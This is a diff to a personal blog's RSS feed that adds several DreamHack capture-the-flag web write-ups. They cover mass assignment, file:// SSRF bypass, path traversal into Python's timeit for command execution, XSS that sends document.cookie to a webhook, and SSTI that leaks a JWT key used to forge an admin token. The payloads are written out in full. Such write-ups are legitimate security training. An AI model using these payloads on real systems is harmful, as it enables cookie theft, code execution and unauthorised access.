@@ -1,4 +1,108 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>minhi1</title><description>blogs</description><link>https://minhi1.github.io/</link><language>en</language><item><title>DreamHack - [phpMyRedis challenge writeup]</title><link>https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-3/phpmyredis/</link><guid isPermaLink="true">https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-3/phpmyredis/</guid><description>Writeup for the phpMyRedis challenge (level 3)</description><pubDate>Tue, 25 Nov 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Browse the app functionalities&lt;/h1&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>minhi1</title><description>blogs</description><link>https://minhi1.github.io/</link><language>en</language><item><title>DreamHack - [Proton Memo challenge writeup]</title><link>https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-4/proton-memo/</link><guid isPermaLink="true">https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-4/proton-memo/</guid><description>Writeup for the Proton Memo challenge (level 4)</description><pubDate>Thu, 25 Dec 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;The vulnerability lies in the &lt;code&gt;set_attr()&lt;/code&gt; function.
+Notice that, the untrusted data here is &lt;code&gt;selected_option&lt;/code&gt;, which is restricted with two options by the front-end, but freely in the backend.&lt;/p&gt;
+&lt;p&gt;The probable unsafe method that &lt;code&gt;selected_option&lt;/code&gt; falls into is &lt;code&gt;setattr()&lt;/code&gt;, which is Python built-in function.&lt;/p&gt;
+&lt;p&gt;So I did a Google search with &lt;code&gt;python setattr() user-controller attributes vulnerability&lt;/code&gt; and found this &lt;a href=&quot;https://snyk.io/blog/the-dangers-of-setattr-avoiding-mass-assignment/&quot;&gt;link&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;This challenge is vulnerable to &lt;code&gt;mass_assignment&lt;/code&gt; vulnerability and thanks to the &lt;code&gt;hasattr()&lt;/code&gt; and &lt;code&gt;getattr()&lt;/code&gt; functions, we could traverse to the from a memo instance to its class, which able to access the shared &lt;code&gt;collections&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Payload:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;selected_option=__class__.collections.&amp;lt;secret-uuid&amp;gt;.password
+edit_data=&amp;lt;sha256-of-new-password&amp;gt;
+password=&amp;lt;your-memo-password&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+</content:encoded></item><item><title>DreamHack - [web-HTTP-CLI challenge writeup]</title><link>https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-4/web-http-cli/</link><guid isPermaLink="true">https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-4/web-http-cli/</guid><description>Writeup for the web-HTTP-CLI challenge (level 4)</description><pubDate>Thu, 25 Dec 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;The program receives a URL and the server sends request to the URL.&lt;/p&gt;
+&lt;p&gt;Since the URL is sent by the server, it could lead to Server-Side Request Forgery (SSRF) or Local File Inclusion (LFI).&lt;/p&gt;
+&lt;p&gt;Don&apos;t bind the URL with http always, there are many more schemes. In this problem, flag is located at &lt;code&gt;/app/flag.txt&lt;/code&gt;, and we have a URI scheme &lt;code&gt;file://&lt;/code&gt; to read file.&lt;/p&gt;
+&lt;p&gt;So now we just need to bypass the url checking condition.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;def get_host_port(url):
+    return url.split(&apos;://&apos;)[1].split(&apos;/&apos;)[0].lower().split(&apos;:&apos;)
+
+(host, port) = get_host_port(url)
+if &apos;localhost&apos; == host:
+    cs.sendall(&apos;cant use localhost\n&apos;.encode())
+    continue
+if &apos;dreamhack.io&apos; != host:
+    if &apos;.&apos; in host:
+        cs.sendall(&apos;cant use .\n&apos;.encode())
+        continue
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The &lt;code&gt;get_host_port()&lt;/code&gt; gets the host and port of the URL by taking the second element after splitting &lt;code&gt;://&lt;/code&gt;, then takes the first element after splitting &lt;code&gt;/&lt;/code&gt;, and finally splits by &lt;code&gt;:&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;After reading on wikipedia about valid URL scheme, &lt;a href=&quot;https://en.wikipedia.org/wiki/File_URI_scheme&quot;&gt;wikipedia&lt;/a&gt;, it indicates this.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;A valid file URI must therefore begin with either &lt;code&gt;file:/path&lt;/code&gt; (no hostname), &lt;code&gt;file:///path&lt;/code&gt; (empty hostname), or &lt;code&gt;file://hostname/path&lt;/code&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Choosing the &quot;no hostname&quot; way to go is fine. Since it still splits by &lt;code&gt;:&lt;/code&gt; at the end, we can just add an arbitrary port.&lt;/p&gt;
+&lt;p&gt;The payload is.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;file://:1/app/flag.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; file://:1/app/flag.txt
+result: DH{5e2c73de0f2b273731665914bfaff022}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;🚩 FLAG: DH{5e2c73de0f2b273731665914bfaff022}&lt;/code&gt;&lt;/p&gt;
+</content:encoded></item><item><title>DreamHack - [Pyramid challenge writeup]</title><link>https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-4/pyramid/</link><guid isPermaLink="true">https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-4/pyramid/</guid><description>Writeup for the Pyramid challenge (level 4)</description><pubDate>Thu, 25 Dec 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;First direction I would think of, I wonder &lt;em&gt;&quot;can I use -c interpret flag to somehow execute the string as python code&quot;&lt;/em&gt;. But order matters, so after reading the &lt;code&gt;.py&lt;/code&gt; file, the rest is treated as arguments.&lt;/p&gt;
+&lt;p&gt;Based on the code, we must input an &lt;strong&gt;existed&lt;/strong&gt; filename that combines with &lt;code&gt;.py&lt;/code&gt; extension (&lt;code&gt;cmd[1]&lt;/code&gt;).
+--&amp;gt; &lt;em&gt;What if we can check for other &lt;code&gt;.py&lt;/code&gt; file in the filesystem?&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;A Linux default path for python module is&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/usr/lib/python3.x/module_name.py
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Since the blacklist does not block the &lt;code&gt;.&lt;/code&gt; and &lt;code&gt;/&lt;/code&gt; character, this means we could traverse to other directory.&lt;/p&gt;
+&lt;p&gt;We can read the flag location and python version in the Dockerfile.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;FROM python:3.11-slim
+...
+RUN echo &quot;DH{this_is_not_real_flag}&quot; &amp;gt; flag
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;From Dockerfile, we know that Python version is 3.11 and flag file is in &lt;code&gt;/app&lt;/code&gt; directory.&lt;/p&gt;
+&lt;p&gt;We can test the module name with below payload.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://host8.dreamhack.games:14392/?../usr/lib/python3.11/os
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The &quot;No such file ...&quot; string does not appear, that means we successfully execute the module file.&lt;/p&gt;
+&lt;p&gt;The direction now is to find a module that does read the arguments and execute those as Python code. After a while searching, I found the Python standard library &lt;code&gt;timeit.py&lt;/code&gt; (&lt;a href=&quot;https://docs.python.org/3/library/timeit.html&quot;&gt;doc&lt;/a&gt;), which measures execution time of small code snippets.&lt;/p&gt;
+&lt;p&gt;We can use this library to craft a payload.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://host8.dreamhack.games:14392/?../usr/lib/python3.11/timeit&amp;amp;import+os&amp;amp;os.system(&apos;cat+/app/flag&apos;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then we can successfully get the flag.
+&lt;code&gt;🚩 FLAG: DH{there_is_/lib/python3.11/timeit.py}&lt;/code&gt;&lt;/p&gt;
+</content:encoded></item><item><title>DreamHack - [Guest book challenge writeup]</title><link>https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-5/guest-book/</link><guid isPermaLink="true">https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-5/guest-book/</guid><description>Writeup for the Guest book challenge (level 5)</description><pubDate>Thu, 25 Dec 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;There is an &lt;strong&gt;XSS vulnerability&lt;/strong&gt; with the markdown link regex replace.
+When send the link to the admin, the &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; tag is not automatically clicked. So I did a Google search with &lt;code&gt;&amp;lt;a&amp;gt; tag auto click vulnerability&lt;/code&gt;, and found this &lt;a href=&quot;https://security.stackexchange.com/questions/168909/xss-inside-anchor-tag-a-without-user-interaction&quot;&gt;link&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;It recommends the payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;a href=&quot;#&quot; autofocus=&quot;true&quot; onfocus=&quot;alert(&apos;xss&apos;)&quot;&amp;gt;hello world!&amp;lt;/a&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;using &lt;code&gt;autofocus&lt;/code&gt; and &lt;code&gt;onfocus&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;So we craft a similar payload.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[uia](javascript:location.href=`{webhook_url}?leak=`+document.cookie&apos; autofocus=&apos;true&apos; onfocus=&apos;location.href=this.href&apos;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Remember to wrap the &lt;code&gt;autofocus&lt;/code&gt; and &lt;code&gt;onfocus&lt;/code&gt; with single quote, double quote is html escaped. I don&apos;t know why but the most likely reason is due to php version &amp;lt; 8.1.0, read in the Changelog section in &lt;a href=&quot;https://www.php.net/manual/en/function.htmlentities.php&quot;&gt;php-htmlentities&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Send the payload to the report section and we get the flag.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;🚩 FLAG: DH{26763025e32e6b24fedfc3206054d6a7}&lt;/code&gt;&lt;/p&gt;
+</content:encoded></item><item><title>DreamHack - [Rednose Airlines challenge writeup]</title><link>https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-5/rednose-airlines/</link><guid isPermaLink="true">https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-5/rednose-airlines/</guid><description>Writeup for the Rednose Airlines challenge (level 5)</description><pubDate>Thu, 25 Dec 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;There is a SSTI vulnerability in &lt;code&gt;/login&lt;/code&gt; endpoint at this code.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;return render_template_string(&apos;{form_id} is not registered, or the password is incorrect.&apos;.format(form_id=form_id))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Since the &quot;admin&quot; endpoints checks authentication using JWT, and JWT secret key is inside app config.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;JWTKey = &apos;&apos;.join(random.choices(string.ascii_letters, k=50))
+app.config[&apos;JWTKey&apos;] = JWTKey
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Read the &lt;a href=&quot;https://flask.palletsprojects.com/en/stable/templating/#standard-context&quot;&gt;Jinja doc&lt;/a&gt;, we&apos;ll see that &lt;code&gt;config&lt;/code&gt; is a global variables within Jinja by default. So let&apos;s test with payload &lt;code&gt;form_id={{config}}&lt;/code&gt; and &lt;code&gt;form_pw=whatever&lt;/code&gt;. Enter and we get the following result.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;Config {&apos;DEBUG&apos;: False, &apos;TESTING&apos;: False, &apos;PROPAGATE_EXCEPTIONS&apos;: None, &apos;SECRET_KEY&apos;: None, &apos;PERMANENT_SESSION_LIFETIME&apos;: datetime.timedelta(days=31), &apos;USE_X_SENDFILE&apos;: False, &apos;SERVER_NAME&apos;: None, &apos;APPLICATION_ROOT&apos;: &apos;/&apos;, &apos;SESSION_COOKIE_NAME&apos;: &apos;session&apos;, &apos;SESSION_COOKIE_DOMAIN&apos;: None, &apos;SESSION_COOKIE_PATH&apos;: None, &apos;SESSION_COOKIE_HTTPONLY&apos;: True, &apos;SESSION_COOKIE_SECURE&apos;: False, &apos;SESSION_COOKIE_SAMESITE&apos;: None, &apos;SESSION_REFRESH_EACH_REQUEST&apos;: True, &apos;MAX_CONTENT_LENGTH&apos;: None, &apos;SEND_FILE_MAX_AGE_DEFAULT&apos;: None, &apos;TRAP_BAD_REQUEST_ERRORS&apos;: None, &apos;TRAP_HTTP_EXCEPTIONS&apos;: False, &apos;EXPLAIN_TEMPLATE_LOADING&apos;: False, &apos;PREFERRED_URL_SCHEME&apos;: &apos;http&apos;, &apos;TEMPLATES_AUTO_RELOAD&apos;: None, &apos;MAX_COOKIE_SIZE&apos;: 4093, &apos;JWTKey&apos;: &apos;NTTbTFCxngMZqwCpehwPAJLxiIfrQzdVkitgbfwDIlrQNRaxxt&apos;}&amp;gt; is not registered, or the password is incorrect.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So it exposes the JWT key, now let&apos;s use it to craft the payload &lt;code&gt;{&quot;id&quot;:&quot;admin&quot;, &quot;isAdmin&quot;: True}&lt;/code&gt; to successfully access the &lt;code&gt;/api/metar&lt;/code&gt; endpoint.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import jwt
+
+token = jwt.encode({&quot;id&quot;:&quot;admin&quot;,&quot;isAdmin&quot;:True},&apos;NTTbTFCxngMZqwCpehwPAJLxiIfrQzdVkitgbfwDIlrQNRaxxt&apos;,algorithm=&apos;HS256&apos;)
+
+print(token)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Token is:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZX0.JMTqyoTmHy8E6v22pPt6dpwPiMTdHQv8K3jtLsAXDRQ
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now comes a hard part, where in the Dockerfile, it states that the flag filename is &lt;code&gt;flag_{4 random lowercase alphabetic characters}.txt&lt;/code&gt;. And it&apos;s hard because of the parameter &lt;code&gt;shell = False&lt;/code&gt; in &lt;code&gt;subprocess.run()&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The question is, how do we use only &lt;code&gt;curl&lt;/code&gt; to brute force all the filename &lt;strong&gt;without exceeding the requests limit&lt;/strong&gt; (10).&lt;/p&gt;
+&lt;p&gt;Firstly, we can pass any URL into the curl, so it is not necessarily an HTTP protocol, we could use other schema like &lt;code&gt;file:///&lt;/code&gt;, which is useful in this case to read server files.&lt;/p&gt;
+&lt;p&gt;Secondly, after doing google search for a while, read the &lt;a href=&quot;https://everything.curl.dev/cmdline/urls/globbing.html&quot;&gt;curl doc&lt;/a&gt;, we&apos;ll see that curl enables a method to continuously sending request with predefined ranges, which is &lt;strong&gt;URL Globbing&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Why doesn&apos;t it exceed the limit? Because it is sending request to schema &lt;code&gt;file:///&lt;/code&gt;, not the &lt;code&gt;http://.../api/metar&lt;/code&gt;, so even though it keeps sending, the number of HTTP request is only calculated once.&lt;/p&gt;
+&lt;p&gt;URL payload:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://host8.dreamhack.games:11629/api/metar?airport=file:///deploy/flag_[a-z][a-z][a-z][a-z].txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;When it hits the correct filename, it will print out the flag.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;🚩FLAG: DH{ThrvGkkoUso6L6s4LHZUPIUnEXmzjUO8RlJMX8vu2V}&lt;/code&gt;&lt;/p&gt;
+</content:encoded></item><item><title>DreamHack - [phpMyRedis challenge writeup]</title><link>https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-3/phpmyredis/</link><guid isPermaLink="true">https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-3/phpmyredis/</guid><description>Writeup for the phpMyRedis challenge (level 3)</description><pubDate>Tue, 25 Nov 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Browse the app functionalities&lt;/h1&gt;
 &lt;p&gt;The core files are &lt;code&gt;index.php&lt;/code&gt; and &lt;code&gt;config.php&lt;/code&gt;.&lt;/p&gt;
 &lt;h2&gt;index.php&lt;/h2&gt;
 &lt;p&gt;This file allows to type in the command, save the result, and store the command history.&lt;/p&gt;
